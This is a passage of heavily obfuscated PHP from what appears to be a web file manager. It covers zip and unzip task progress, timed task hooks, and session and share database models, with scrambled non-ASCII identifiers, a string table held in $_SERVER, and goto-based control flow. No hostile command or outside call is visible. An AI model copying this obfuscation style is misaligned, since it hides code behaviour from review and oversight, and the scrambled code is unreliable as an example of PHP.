üŒ­ß¤[$€™ÓıÂê[1720]] = 0; } Cache::remove($ üŒ­ß¤[$€™ÓıÂê[452]] . $€™ÓıÂê[1733]); self::log($€™ÓıÂê[1736] . $³†æ¬µ . $€™ÓıÂê[70] . $œÒà´Ñ . $€™ÓıÂê[206] . $È¦ª´âî . $€™ÓıÂê[1737] . $ üŒ­ß¤[$€™ÓıÂê[1717]]); } public function updateFileEnd($ßç¥²¨ç, $˜»ÓšÖÀ) { $™øí÷õ‰ =& $_SERVER[–Ú¬çÁ]; $‰à¸‡Î” =& $this->task; $‰à¸‡Î”[$™øí÷õ‰[1717]] = $ßç¥²¨ç; $‰à¸‡Î”[$™øí÷õ‰[1719]] = $˜»ÓšÖÀ; $‰à¸‡Î”[$™øí÷õ‰[1723]] += $˜»ÓšÖÀ; $‰à¸‡Î”[$™øí÷õ‰[1724]] = $‰à¸‡Î”[$™øí÷õ‰[1723]]; $this->update(1); self::log($™øí÷õ‰[1738] . $ßç¥²¨ç); } public function sourceModelCopy($õşş¸Ë) { $Õµ†÷Âï =& $_SERVER[–Ú¬çÁ]; $êí’ù™ = $õşş¸Ë[0]; $Å£¯¶ßì = $õşş¸Ë[1]; $ØŒ¤¶°á =& $this->task; $this->sourceModelCopyFlag = !0; $èå¬Ì = 0; switch ($êí’ù™) { case $Õµ†÷Âï[613]: $èå¬Ì = 1; break; case $Õµ†÷Âï[616]: $ØŒ¤¶°á[$Õµ†÷Âï[1717]] = $Å£¯¶ßì[$Õµ†÷Âï[32]]; break; case $Õµ†÷Âï[618]: $èå¬Ì = intval($õşş¸Ë[$Õµ†÷Âï[433]] * 0.4); break; case $Õµ†÷Âï[620]: $èå¬Ì = intval($õşş¸Ë[$Õµ†÷Âï[433]] * 0.2); break; case $Õµ†÷Âï[622]: $èå¬Ì = intval($õşş¸Ë[$Õµ†÷Âï[433]] * 0.4); break; } $this->update($èå¬Ì); $this->sourceModelCopyFlag = !1; } public function sourceRemove($º‘õÔò¨, $ß¾£Îƒ¢) { $À¶øªŒÅ =& $_SERVER[–Ú¬çÁ]; $this->sourceModelCopyFlag = !0; $¡²šæå– = 1; if (isset($º‘õÔò¨[$À¶øªŒÅ[79]])) { $¡²šæå– = $º‘õÔò¨[$À¶øªŒÅ[79]][$À¶øªŒÅ[77]]; $¡²šæå– = $¡²šæå– + $º‘õÔò¨[$À¶øªŒÅ[79]][$À¶øªŒÅ[78]] + 1; } $this->update($¡²šæå–); $this->sourceModelCopyFlag = !1; } public function sourceMove($¾í‰š©) { $this->sourceRemove($¾í‰š©, !1); } public function curlProgress($èşŒû‚á, $‘ÄãŞ…â, $‡Ô¶¯Ø˜, $ÛÑ°‚ÀÍ, $“Ø±ùµÅ) { $ÒË‚É½È =& $_SERVER[–Ú¬çÁ]; $İÔˆ‰‘æ =& $this->task; if ($“Ø±ùµÅ > 0) { $İÔˆ‰‘æ[$ÒË‚É½È[1084]] = $ÒË‚É½È[1739]; $İÔˆ‰‘æ[$ÒË‚É½È[1721]] = $ÒË‚É½È[107]; if ($İÔˆ‰‘æ[$ÒË‚É½È[1719]]) { $İÔˆ‰‘æ[$ÒË‚É½È[1720]] = $“Ø±ùµÅ; } if ($İÔˆ‰‘æ[$ÒË‚É½È[1722]]) { $İÔˆ‰‘æ[$ÒË‚É½È[1720]] = $“Ø±ùµÅ + $İÔˆ‰‘æ[$ÒË‚É½È[1722]]; } } else { if ($‡Ô¶¯Ø˜ > 0) { if ($İÔˆ‰‘æ[$ÒË‚É½È[1719]] == $‘ÄãŞ…â) { $İÔˆ‰‘æ[$ÒË‚É½È[1720]] = $‡Ô¶¯Ø˜; $İÔˆ‰‘æ[$ÒË‚É½È[1084]] = $ÒË‚É½È[1740]; $İÔˆ‰‘æ[$ÒË‚É½È[1721]] = $ÒË‚É½È[1214]; } } } $this->update(); } public function curlProgressStart($ı—‚ƒãâ) { } public function curlProgressEnd($ã¦´‰Ó®) { $â¸Ö„ =& $_SERVER[–Ú¬çÁ]; $êÀ˜éëû =& $this->task; $æàä¬Æ = curl_getinfo($ã¦´‰Ó®); $ÄÉ€êªÕ = $æàä¬Æ[$â¸Ö„[1741]]; if ($ÄÉ€êªÕ == -1) { $ÄÉ€êªÕ = $æàä¬Æ[$â¸Ö„[1742]]; } if ($êÀ˜éëû[$â¸Ö„[1721]] == $â¸Ö„[107] && $ÄÉ€êªÕ) { $êÀ˜éëû[$â¸Ö„[1722]] += $ÄÉ€êªÕ; } $this->update(); } } goto BÑ×ê ªÑ‘; B–¡‰‹äğ¾: define($_SERVER[–Ú¬çÁ][294], 1); define($_SERVER[–Ú¬çÁ][295], 0); define($_SERVER[–Ú¬çÁ][296], 2); goto a‡ğšÇ‰ªÍ; A¸ ¹‹ÖŞ·: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($•£±¹â“, $œ§ú÷î» = 5.0) { if (!$•£±¹â“) { return; } $¨ü³©œ = Cache::get($•£±¹â“); if (!$¨ü³©œ || timeFloat() - floatVal($¨ü³©œ) >= $œ§ú÷î») { Cache::set($•£±¹â“, timeFloat(), $œ§ú÷î» * 10); return !0; } return !1; } public static function timeLimitCall($ªÜ«©€†, $µİâËğ§, $öÚ¤¸·¯, $ºÛÒ¬­ = 5.0) { $¦ÑÀ™çÂ =& $_SERVER[–Ú¬çÁ]; if (!$ªÜ«©€† || !$µİâËğ§) { return; } self::$asyncAdd = !0; $Íş»ª¶Ä = $¦ÑÀ™çÂ[1772]; $Ø¯ŸñÂ— = Cache::get($Íş»ª¶Ä, !0); $Š‘³¸Ö = array($¦ÑÀ™çÂ[1773] => timeFloat(), $¦ÑÀ™çÂ[1774] => timeFloat(), $¦ÑÀ™çÂ[317] => $µİâËğ§, $¦ÑÀ™çÂ[1764] => $öÚ¤¸·¯, $¦ÑÀ™çÂ[194] => $ºÛÒ¬­); if (is_array($Ø¯ŸñÂ—[$ªÜ«©€†])) { $Š‘³¸Ö[$¦ÑÀ™çÂ[1774]] = $Ø¯ŸñÂ—[$ªÜ«©€†][$¦ÑÀ™çÂ[1774]]; } if (is_array($Ø¯ŸñÂ—[$ªÜ«©€†])) { if (timeFloat() - $Ø¯ŸñÂ—[$ªÜ«©€†][$¦ÑÀ™çÂ[1773]] < $Š‘³¸Ö[$¦ÑÀ™çÂ[194]] * 0.3) { return; } $Š‘³¸Ö[$¦ÑÀ™çÂ[1774]] = $Ø¯ŸñÂ—[$ªÜ«©€†][$¦ÑÀ™çÂ[1774]]; } $Ø¯ŸñÂ—[$ªÜ«©€†] = $Š‘³¸Ö; Cache::set($Íş»ª¶Ä, $Ø¯ŸñÂ—, 60); Cache::removeMemory($Íş»ª¶Ä); write_log($¦ÑÀ™çÂ[1775] . $ªÜ«©€† . $¦ÑÀ™çÂ[71] . $µİâËğ§, $¦ÑÀ™çÂ[185]); } public static function timeLimitCallLoop() { $ÅÔâ¯êà =& $_SERVER[–Ú¬çÁ]; $á­¼±µ… = array($ÅÔâ¯êà[1776]); $Ğ“Ùæ¹÷ = in_array(strtolower(ACTION), $á­¼±µ…); if (!$Ğ“Ùæ¹÷ && !self::$asyncAdd) { return; } $â×¾Ó›í = $ÅÔâ¯êà[1772]; $“õÄÏ˜Ò = Cache::get($â×¾Ó›í, !0); if (!$“õÄÏ˜Ò || count($“õÄÏ˜Ò) <= 0) { return; } $˜Ã–›ˆÌ = !1; $…¸ ÂÎ¥ = timeFloat(); $Šâ‹²¥Û = array(); foreach ($“õÄÏ˜Ò as $¶Áá”œÛ => $Öü ’³) { if ($…¸ ÂÎ¥ - $Öü ’³[$ÅÔâ¯êà[1774]] > $Öü ’³[$ÅÔâ¯êà[194]]) { $˜Ã–›ˆÌ = !0; try { Hook::apply($Öü ’³[$ÅÔâ¯êà[317]], $Öü ’³[$ÅÔâ¯êà[1764]]); write_log($ÅÔâ¯êà[1777] . $¶Áá”œÛ . $ÅÔâ¯êà[71] . $Öü ’³[$ÅÔâ¯êà[317]] . $ÅÔâ¯êà[1778] . ACTION, $ÅÔâ¯êà[185]); } catch (Exception $×ÚÏş¢İ) { } continue; } $Šâ‹²¥Û[$¶Áá”œÛ] = $Öü ’³; } if (!$˜Ã–›ˆÌ) { return; } if (!$Šâ‹²¥Û) { return Cache::remove($â×¾Ó›í); } Cache::set($â×¾Ó›í, $Šâ‹²¥Û, 60); Cache::removeMemory($â×¾Ó›í); } public static function finished($ˆ¥âìóÛ, $©‰‚ÈŞ) { $Ùë†íá˜ =& $_SERVER[–Ú¬çÁ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Ùë†íá˜[317] => $ˆ¥âìóÛ, $Ùë†íá˜[1764] => $©‰‚ÈŞ); } private static function finishedRun() { $ŸÒö¨ş =& $_SERVER[–Ú¬çÁ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Çó„°¶Ÿ) { try { Hook::apply($Çó„°¶Ÿ[$ŸÒö¨ş[317]], $Çó„°¶Ÿ[$ŸÒö¨ş[1764]]); } catch (Exception $™¦­ê‚½) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ñœ•Øƒ² =& $_SERVER[–Ú¬çÁ]; parent::startAfter(); Hook::bind($ñœ•Øƒ²[1779], array($this, $ñœ•Øƒ²[1780])); Hook::bind($ñœ•Øƒ²[1213], array($this, $ñœ•Øƒ²[1781])); Hook::bind($ñœ•Øƒ²[1782], array($this, $ñœ•Øƒ²[1783])); $Ì¯âÓÔ =& $this->task; $Ì¯âÓÔ[$ñœ•Øƒ²[1784]] = $ñœ•Øƒ²[1214]; if (!$Ì¯âÓÔ[$ñœ•Øƒ²[1561]]) { $Ì¯âÓÔ[$ñœ•Øƒ²[1561]] = LNG($ñœ•Øƒ²[1785]); } } protected function endAfter() { $¸À¼Æ½³ =& $_SERVER[–Ú¬çÁ]; parent::endAfter(); Hook::unbind($¸À¼Æ½³[1779], array($this, $¸À¼Æ½³[1780])); Hook::unbind($¸À¼Æ½³[1213], array($this, $¸À¼Æ½³[1781])); Hook::unbind($¸À¼Æ½³[1782], array($this, $¸À¼Æ½³[1783])); } public function updateAfter() { $‰Êš·›¦ =& $_SERVER[–Ú¬çÁ]; $Ç…ï«í¡ =& $this->task; if (!$Ç…ï«í¡[$‰Êš·›¦[806]] || !$Ç…ï«í¡[$‰Êš·›¦[783]]) { if ($Ç…ï«í¡[$‰Êš·›¦[1784]] != $‰Êš·›¦[366]) { return; } } if ($Ç…ï«í¡[$‰Êš·›¦[1784]] == $‰Êš·›¦[1214]) { $œÊÁ¿ªë = 0; if ($Ç…ï«í¡[$‰Êš·›¦[1719]]) { $œÊÁ¿ªë = $Ç…ï«í¡[$‰Êš·›¦[1720]] / $Ç…ï«í¡[$‰Êš·›¦[1719]]; } $Ç…ï«í¡[$‰Êš·›¦[1668]] = $œÊÁ¿ªë * 0.3; } else { if ($Ç…ï«í¡[$‰Êš·›¦[1784]] == $‰Êš·›¦[366]) { $œÊÁ¿ªë = $Ç…ï«í¡[$‰Êš·›¦[1667]] / $Ç…ï«í¡[$‰Êš·›¦[806]]; $Ç…ï«í¡[$‰Êš·›¦[1668]] = 0.3 + $œÊÁ¿ªë * 0.4; } else { if ($Ç…ï«í¡[$‰Êš·›¦[1784]] == $‰Êš·›¦[107]) { $Ñ®êò™Í = 0; if ($Ç…ï«í¡[$‰Êš·›¦[1721]] == $‰Êš·›¦[107]) { $Ñ®êò™Í = $Ç…ï«í¡[$‰Êš·›¦[1720]]; } $œÊÁ¿ªë = ($Ç…ï«í¡[$‰Êš·›¦[1724]] + $Ñ®êò™Í) / $Ç…ï«í¡[$‰Êš·›¦[783]]; $Ç…ï«í¡[$‰Êš·›¦[1668]] = 0.3 + 0.4 + $œÊÁ¿ªë * 0.3; } } } if ($Ç…ï«í¡[$‰Êš·›¦[1668]] > 0) { $‘ÉÏÃ›î = timeFloat() - $Ç…ï«í¡[$‰Êš·›¦[1670]] - $Ç…ï«í¡[$‰Êš·›¦[1673]]; $Ç…ï«í¡[$‰Êš·›¦[1674]] = $‘ÉÏÃ›î * (1 - $Ç…ï«í¡[$‰Êš·›¦[1668]]) / $Ç…ï«í¡[$‰Êš·›¦[1668]]; } } public function addFile($§¢ôÂÉ) { $æâÛÄ =& $_SERVER[–Ú¬çÁ]; $”Şº¨ä¡ =& $this->task; $¡ªÖ•¸ş = IO::info($§¢ôÂÉ); $”Şº¨ä¡[$æâÛÄ[1717]] = $¡ªÖ•¸ş[$æâÛÄ[32]]; $”Şº¨ä¡[$æâÛÄ[1719]] = $¡ªÖ•¸ş[$æâÛÄ[76]]; $”Şº¨ä¡[$æâÛÄ[1720]] = 0; $”Şº¨ä¡[$æâÛÄ[1084]] = $æâÛÄ[1740]; $”Şº¨ä¡[$æâÛÄ[1721]] = $æâÛÄ[1214]; $”Şº¨ä¡[$æâÛÄ[783]] = $¡ªÖ•¸ş[$æâÛÄ[76]]; $”Şº¨ä¡[$æâÛÄ[806]] = 1; $Õ®ŞâƒÜ = 0; $”Şº¨ä¡[$æâÛÄ[1728]] = array($æâÛÄ[1729] => $Õ®ŞâƒÜ + 1, $æâÛÄ[471] => $¡ªÖ•¸ş[$æâÛÄ[32]], $æâÛÄ[84] => $¡ªÖ•¸ş[$æâÛÄ[84]], $æâÛÄ[561] => $¡ªÖ•¸ş[$æâÛÄ[561]] ? $¡ªÖ•¸ş[$æâÛÄ[561]] : $¡ªÖ•¸ş[$æâÛÄ[84]]); $this->update(); } public function zipEvent($ÆÓ’à‰, $…ÎÍŸù, $’¥ÊÅ€º, $Á‘‚ğ¦¬) { $—²ŞœÊÅ =& $_SERVER[–Ú¬çÁ]; $¥íş§ÍÆ =& $this->task; $¥íş§ÍÆ[$—²ŞœÊÅ[1717]] = get_path_this($…ÎÍŸù); $¥íş§ÍÆ[$—²ŞœÊÅ[1719]] = $Á‘‚ğ¦¬; $¥íş§ÍÆ[$—²ŞœÊÅ[1720]] = $’¥ÊÅ€º; $¥íş§ÍÆ[$—²ŞœÊÅ[1084]] = $ÆÓ’à‰ == $—²ŞœÊÅ[1786] ? $—²ŞœÊÅ[1787] : $—²ŞœÊÅ[1788]; $¥íş§ÍÆ[$—²ŞœÊÅ[1721]] = $—²ŞœÊÅ[12]; $¥íş§ÍÆ[$—²ŞœÊÅ[783]] = $Á‘‚ğ¦¬; $¥íş§ÍÆ[$—²ŞœÊÅ[1784]] = $—²ŞœÊÅ[366]; $this->update(); } public function unzipAfter($¹ó²¿ÈÊ) { $òÖëúˆ¶ =& $_SERVER[–Ú¬çÁ]; $ëŞ¾ôë =& $this->task; $ëŞ¾ôë[$òÖëúˆ¶[1784]] = $òÖëúˆ¶[107]; $àØ‚îè = IO::infoWithChildren($¹ó²¿ÈÊ); $Ÿ„Õõ’× = 0; $ëŞ¾ôë[$òÖëúˆ¶[1728]] = array($òÖëúˆ¶[1729] => $Ÿ„Õõ’× + 1, $òÖëúˆ¶[471] => $àØ‚îè[$òÖëúˆ¶[32]], $òÖëúˆ¶[84] => $àØ‚îè[$òÖëúˆ¶[84]], $òÖëúˆ¶[561] => $àØ‚îè[$òÖëúˆ¶[561]] ? $àØ‚îè[$òÖëúˆ¶[561]] : $àØ‚îè[$òÖëúˆ¶[84]]); if ($àØ‚îè[$òÖëúˆ¶[33]] == $òÖëúˆ¶[224]) { $ëŞ¾ôë[$òÖëúˆ¶[806]] = 1; } else { $ëŞ¾ôë[$òÖëúˆ¶[806]] = $àØ‚îè[$òÖëúˆ¶[79]][$òÖëúˆ¶[77]]; } $ëŞ¾ôë[$òÖëúˆ¶[1084]] = $òÖëúˆ¶[12]; $ëŞ¾ôë[$òÖëúˆ¶[1721]] = 0; $ëŞ¾ôë[$òÖëúˆ¶[1667]] = 0; $ëŞ¾ôë[$òÖëúˆ¶[1719]] = 0; $ëŞ¾ôë[$òÖëúˆ¶[1720]] = 0; $ëŞ¾ôë[$òÖëúˆ¶[1717]] = $òÖëúˆ¶[12]; $ëŞ¾ôë[$òÖëúˆ¶[1724]] = 0; $ëŞ¾ôë[$òÖëúˆ¶[783]] = $àØ‚îè[$òÖëúˆ¶[76]]; $this->update(); self::log($òÖëúˆ¶[1789] . json_encode(array($ëŞ¾ôë, $àØ‚îè))); } public function nameParse($øƒ¦ƒ–ö) { $•ÎĞµ«È =& $_SERVER[–Ú¬çÁ]; $Ä®Å ê¨ =& $this->task; if ($Ä®Å ê¨[$•ÎĞµ«È[1784]] == $•ÎĞµ«È[1214]) { $Ä®Å ê¨[$•ÎĞµ«È[1784]] = $•ÎĞµ«È[366]; $Ä®Å ê¨[$•ÎĞµ«È[1724]] = 0; $Ä®Å ê¨[$•ÎĞµ«È[783]] = 0; } $ †úÓŒ = get_path_this($øƒ¦ƒ–ö); if (strstr($ †úÓŒ, $•ÎĞµ«È[10])) { $Ä®Å ê¨[$•ÎĞµ«È[1667]] += 1; $Ä®Å ê¨[$•ÎĞµ«È[806]] += 1; } $Ä®Å ê¨[$•ÎĞµ«È[1717]] = $øƒ¦ƒ–ö; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Óçşö†Â =& $_SERVER[–Ú¬çÁ]; parent::startAfter(); Hook::bind($Óçşö†Â[1790], array($this, $Óçşö†Â[1780])); Hook::bind($Óçşö†Â[1782], array($this, $Óçşö†Â[1783])); $Ø’äª×° =& $this->task; $Ø’äª×°[$Óçşö†Â[1784]] = $Óçşö†Â[1214]; if (!$Ø’äª×°[$Óçşö†Â[1561]]) { $Ø’äª×°[$Óçşö†Â[1561]] = LNG($Óçşö†Â[1791]); } } protected function endAfter() { $óª§« =& $_SERVER[–Ú¬çÁ]; parent::endAfter(); Hook::unbind($óª§«[1790], array($this, $óª§«[1780])); Hook::unbind($óª§«[1782], array($this, $óª§«[1783])); } public function updateAfter() { $ Ù¶Œó =& $_SERVER[–Ú¬çÁ]; $¡œÖó¿ =& $this->task; if (!$¡œÖó¿[$ Ù¶Œó[806]] || !$¡œÖó¿[$ Ù¶Œó[783]]) { return; } if ($¡œÖó¿[$ Ù¶Œó[1784]] == $ Ù¶Œó[1214]) { $¢¾Ş†é = $¡œÖó¿[$ Ù¶Œó[1720]]; if ($¡œÖó¿[$ Ù¶Œó[1721]] != $ Ù¶Œó[1214]) { $¢¾Ş†é = 0; } $è¦ùÌ = ($¡œÖó¿[$ Ù¶Œó[1724]] + $¢¾Ş†é) / $¡œÖó¿[$ Ù¶Œó[783]]; $¡œÖó¿[$ Ù¶Œó[1668]] = $è¦ùÌ * 0.3; } else { if ($¡œÖó¿[$ Ù¶Œó[1784]] == $ Ù¶Œó[366]) { $è¦ùÌ = $¡œÖó¿[$ Ù¶Œó[1667]] / $¡œÖó¿[$ Ù¶Œó[806]]; $¡œÖó¿[$ Ù¶Œó[1668]] = 0.3 + $è¦ùÌ * 0.5; } else { if ($¡œÖó¿[$ Ù¶Œó[1784]] == $ Ù¶Œó[107]) { $è¦ùÌ = 0; if ($¡œÖó¿[$ Ù¶Œó[1719]]) { $è¦ùÌ = $¡œÖó¿[$ Ù¶Œó[1720]] / $¡œÖó¿[$ Ù¶Œó[1719]]; } $¡œÖó¿[$ Ù¶Œó[1668]] = 0.3 + 0.5 + $è¦ùÌ * 0.2; } } } if ($¡œÖó¿[$ Ù¶Œó[1668]] > 0) { $©ş÷¸š = timeFloat() - $¡œÖó¿[$ Ù¶Œó[1670]] - $¡œÖó¿[$ Ù¶Œó[1673]]; $¡œÖó¿[$ Ù¶Œó[1674]] = $©ş÷¸š * (1 - $¡œÖó¿[$ Ù¶Œó[1668]]) / $¡œÖó¿[$ Ù¶Œó[1668]]; } } public function copyFileStart($«ûÈÒ›¤, $ÏÜøÄ¡–, $ˆ÷Äüû», $Öâ—úŠ™, $ŒìÛô¿«, $×·ÊôÇâ) { $ì’¸ĞÄ‡ =& $_SERVER[–Ú¬çÁ]; parent::copyFileStart($«ûÈÒ›¤, $ÏÜøÄ¡–, $ˆ÷Äüû», $Öâ—úŠ™, $ŒìÛô¿«, $×·ÊôÇâ); $ª¦ßúëŸ =& $this->task; if ($ª¦ßúëŸ[$ì’¸ĞÄ‡[1784]] == $ì’¸ĞÄ‡[366]) { $ª¦ßúëŸ[$ì’¸ĞÄ‡[1784]] = $ì’¸ĞÄ‡[107]; } $this->update(); } public function copyFileEnd($í²×Íæõ, $Ê©ó†ôÂ, $Â¢ùØ, $è¶…¤“¦, $¹¸Ù‚€Õ, $¸æİÉ¡¨) { $ÖòºäÃ« =& $_SERVER[–Ú¬çÁ]; $é¬×¥êñ =& $this->task; $é¬×¥êñ[$ÖòºäÃ«[1720]] = $é¬×¥êñ[$ÖòºäÃ«[1719]]; $é¬×¥êñ[$ÖòºäÃ«[1724]] += $é¬×¥êñ[$ÖòºäÃ«[1719]]; $é¬×¥êñ[$ÖòºäÃ«[1721]] = $ÖòºäÃ«[12]; $this->update(); } public function zipEvent($Æ¤¶’Óø, $©ç¢ıü, $”ä‹ÓÌ¨, $üº®„) { $—÷â‰¸ =& $_SERVER[–Ú¬çÁ]; $¾şóËüĞ =& $this->task; $¾şóËüĞ[$—÷â‰¸[1717]] = get_path_this($©ç¢ıü); $¾şóËüĞ[$—÷â‰¸[1719]] = $üº®„; $¾şóËüĞ[$—÷â‰¸[1720]] = $”ä‹ÓÌ¨; $¾şóËüĞ[$—÷â‰¸[1084]] = $Æ¤¶’Óø == $—÷â‰¸[1792] ? $—÷â‰¸[1787] : $—÷â‰¸[1788]; $¾şóËüĞ[$—÷â‰¸[1721]] = $—÷â‰¸[12]; $¾şóËüĞ[$—÷â‰¸[783]] = $üº®„; $¾şóËüĞ[$—÷â‰¸[1784]] = $—÷â‰¸[366]; $this->update(); } public function nameParse($‘õÍä½¸) { $ÁÎ‡¢ô¾ =& $_SERVER[–Ú¬çÁ]; $îÊ½ü°ˆ =& $this->task; if ($îÊ½ü°ˆ[$ÁÎ‡¢ô¾[1667]] < $îÊ½ü°ˆ[$ÁÎ‡¢ô¾[806]]) { $÷´±³æı = get_path_this($‘õÍä½¸); if (strstr($÷´±³æı, $ÁÎ‡¢ô¾[10])) { $îÊ½ü°ˆ[$ÁÎ‡¢ô¾[1667]] += 1; } } if ($îÊ½ü°ˆ[$ÁÎ‡¢ô¾[1784]] == $ÁÎ‡¢ô¾[1214]) { $îÊ½ü°ˆ[$ÁÎ‡¢ô¾[1784]] = $ÁÎ‡¢ô¾[366]; } $îÊ½ü°ˆ[$ÁÎ‡¢ô¾[1717]] = $‘õÍä½¸; $this->update(); } } goto EˆõÉµµ˜œ; dŠ¢ñ×ê‹š: function binCheckBigger($ê—¢¸®‡, $¢§ãçÌ…) { return $ê—¢¸®‡ > $¢§ãçÌ…; } $_SERVER[$_SERVER[Àôù‚Í][3]] = ("\70\62\70\61"."\x38\x39")+0;$_bude="ntd8mus519bxgpokh467lj3wc2ivzerq0fya8oyjgpc4m739qbn6shwvtzrakx0e21dfl5iugxlwum8r";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($¾¯«ëõØ, $¬ü“Åìş) { $äâÄŸüì =& $_SERVER[–Ú¬çÁ]; if (isset(self::$_methodList[$¾¯«ëõØ])) { return @call_user_func_array(self::$_methodList[$¾¯«ëõØ], $¬ü“Åìş); } else { if (method_exists($this, $¾¯«ëõØ)) { return call_user_func_array(array($this, $¾¯«ëõØ), $¬ü“Åìş); } else { think_exception(__CLASS__ . $äâÄŸüì[4] . $¾¯«ëõØ . $äâÄŸüì[5]); } } } public static function __callStatic($ƒ¾¸Æâ‚, $ßëŠ½) { if (isset(self::$_methodListStatic[$ƒ¾¸Æâ‚])) { return call_user_func_array(self::$_methodListStatic[$ƒ¾¸Æâ‚], $ßëŠ½); } else { if (method_exists(self, $ƒ¾¸Æâ‚)) { return call_user_func_array(array(self, $ƒ¾¸Æâ‚), $ßëŠ½); } else { show_json("{$ƒ¾¸Æâ‚}\x28\x29\x20\156\x6f\164\40\x65\x78\x69\x73\x74\73", !1); } } } public static function addMethod($•á²Äôû, $äê´óïõ) { self::$_methodList[$•á²Äôû] = $äê´óïõ; } public static function addMethodStatic($„Ä•…†‡, $ŠÂ¬ğæî) { self::$_methodListStatic[$„Ä•…†‡] = $ŠÂ¬ğæî; } } goto B“­ƒøïÉ; AÄò¯íá™: class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\x74\145\x6d\x5f\163\145\163\163\151\x6f\x6e"; public function get($ÒŞ§õÅ›) { $½À‚—”œ =& $_SERVER[–Ú¬çÁ]; $ş¿ş­ºª = $this->where(array($½À‚—”œ[1999] => $ÒŞ§õÅ›))->find(); if (!is_array($ş¿ş­ºª)) { return !1; } return $ş¿ş­ºª[$½À‚—”œ[774]]; } public function set($¶Ê“üŸâ, $Ë¨±€Âı, $üËîÊóà = 3600) { $û¯Ş’ì© =& $_SERVER[–Ú¬çÁ]; $ËÖè¸ì = array($û¯Ş’ì©[1999] => $¶Ê“üŸâ, $û¯Ş’ì©[1903] => $Ë¨±€Âı, $û¯Ş’ì©[2000] => $üËîÊóà + time()); if (Session::get($û¯Ş’ì©[2001])) { $ËÖè¸ì[$û¯Ş’ì©[1666]] = Session::get($û¯Ş’ì©[2001]); } else { $ËÖè¸ì[$û¯Ş’ì©[1666]] = 0; } if ($this->get($¶Ê“üŸâ)) { return $this->where(array($û¯Ş’ì©[1999] => $¶Ê“üŸâ))->save($ËÖè¸ì); } else { return $this->add($ËÖè¸ì, array(), !0); } } public function remove($ïÃˆšãÙ) { return $this->where(array($_SERVER[–Ú¬çÁ][1999] => $ïÃˆšãÙ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[–Ú¬çÁ][2002] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\x65"; protected $dataAuto = array(array("\155\x6f\x64\x69\x66\171\124\x69\155\145", "\164\x69\155\x65", "\151\x6e\x73\145\162\x74\x2c\x75\x70\x64\141\x74\145", "\x66\x75\x6e\x63\x74\151\x6f\156"), array("\x63\x72\145\141\x74\145\124\x69\155\x65", "\x74\x69\x6d\x65", "\151\156\163\145\x72\164", "\146\165\156\143\164\151\x6f\156"), array("\157\160\x74\x69\x6f\156\163", '', "\x69\x6e\163\x65\162\164\54\165\x70\144\x61\x74\x65\54\x73\145\154\145\x63\164", "\x6a\163\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($´ˆ™É») { $öáğÛß‹ =& $_SERVER[–Ú¬çÁ]; $úÑ¹Èë = isset($´ˆ™É»[0]) ? $´ˆ™É»[0] : !1; return array($öáğÛß‹[2003] => array(USER_ID, $öáğÛß‹[2004]), $öáğÛß‹[1944] => array($úÑ¹Èë, $öáğÛß‹[2005])); } protected function listSimple() { $İË¥·ºŞ = array($_SERVER[–Ú¬çÁ][1666] => USER_ID); $Àø´ŞÜé = $this->field($this->fieldList)->where($İË¥·ºŞ)->select(); return $Àø´ŞÜé ? $Àø´ŞÜé : array(); } protected function getInfo($®ä«áËÔ, $ÊµÓŒÒ£ = false) { $Õ¿à‡òº =& $_SERVER[–Ú¬çÁ]; if ($ÊµÓŒÒ£) { return $this->_getShareInfo(array($Õ¿à‡òº[643] => $®ä«áËÔ)); } $Ì¯ÎÔ™ï = $this->cacheFunctionGet($Õ¿à‡òº[1946], $®ä«áËÔ); return $Ì¯ÎÔ™ï; } public function getInfoByHash($°÷¼“¯Ó) { return $this->_getShareInfo(array($_SERVER[–Ú¬çÁ][2006] => $°÷¼“¯Ó)); } public function getInfoByPath($™Šï‚ì™) { $åÎîüéù =& $_SERVER[–Ú¬çÁ]; $èŠÙÄšÇ = array($åÎîüéù[1666] => USER_ID, $åÎîüéù[181] => $™Šï‚ì™); return $this->_getShareInfo($èŠÙÄšÇ); } public function getInfoBySourcePath($‡¨ûÙÊÁ) { $’ñ…ÖÍõ =& $_SERVER[–Ú¬çÁ]; $¢–¹²›æ = array($’ñ…ÖÍõ[1666] => USER_ID, $’ñ…ÖÍõ[1195] => $‡¨ûÙÊÁ); return $this->_getShareInfo($¢–¹²›æ); } private function _getShareInfo($Õüƒ«şÁ) { $œ¶Ü§àô =& $_SERVER[–Ú¬çÁ]; $“±øö· = $this->where($Õüƒ«şÁ)->find(); if (!$“±øö·) { return !1; } $Õüƒ«şÁ = array($œ¶Ü§àô[643] => $“±øö·[$œ¶Ü§àô[643]]); $š”«ô‚¸ = $œ¶Ü§àô[2007]; $¾‚ãë¨İ = Model($œ¶Ü§àô[644])->order($œ¶Ü§àô[452])->field($š”«ô‚¸)->where($Õüƒ«şÁ)->select(); if ($“±øö·[$œ¶Ü§àô[181]] == $œ¶Ü§àô[222]) { $“±øö·[$œ¶Ü§àô[87]] = IO::info($“±øö·[$œ¶Ü§àô[1195]]); } else { $“±øö·[$œ¶Ü§àô[87]] = Model($œ¶Ü§àô[1352])->pathInfo($“±øö·[$œ¶Ü§àô[181]]); } $“±øö·[$œ¶Ü§àô[2008]] = $¾‚ãë¨İ; return $“±øö·; } protected function getInfoAuth($¸‚•ß¡‡) { $ËÔà·êí =& $_SERVER[–Ú¬çÁ]; $õêæÆ€ = $this->getInfo($¸‚•ß¡‡); if ($õêæÆ€[$ËÔà·êí[1666]] == USER_ID) { $õêæÆ€[$ËÔà·êí[464]] = $õêæÆ€[$ËÔà·êí[87]][$ËÔà·êí[464]]; } else { $õêæÆ€[$ËÔà·êí[464]] = Model($ËÔà·êí[545])->authMake($õêæÆ€[$ËÔà·êí[2008]]); } return $õêæÆ€; } protected function listData($ªìœ˜Î– = null, $©ƒßãã™ = 300) { $½ó¸ò =& $_SERVER[–Ú¬çÁ]; $¼ÍêÀ³Ê = array(array($½ó¸ò[540] => array($½ó¸ò[1032], 0), $½ó¸ò[641] 